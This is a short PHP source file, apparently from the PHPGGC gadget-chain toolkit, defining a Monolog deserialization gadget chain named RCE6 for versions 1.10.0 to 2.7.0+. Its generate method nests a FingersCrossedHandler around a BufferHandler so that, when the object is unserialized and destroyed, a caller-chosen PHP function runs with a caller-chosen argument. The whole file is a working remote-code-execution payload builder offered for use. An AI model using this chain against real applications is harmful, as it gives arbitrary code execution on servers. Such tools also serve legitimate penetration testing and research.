<?php

namespace GadgetChain\Monolog;

class RCE6 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.10.0 <= 2.7.0+';
    public static $vector = '__destruct';
    public static $author = 'mayfly';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        return new \Monolog\Handler\FingersCrossedHandler($parameter,
            new \Monolog\Handler\BufferHandler($function)
        );
    }
}
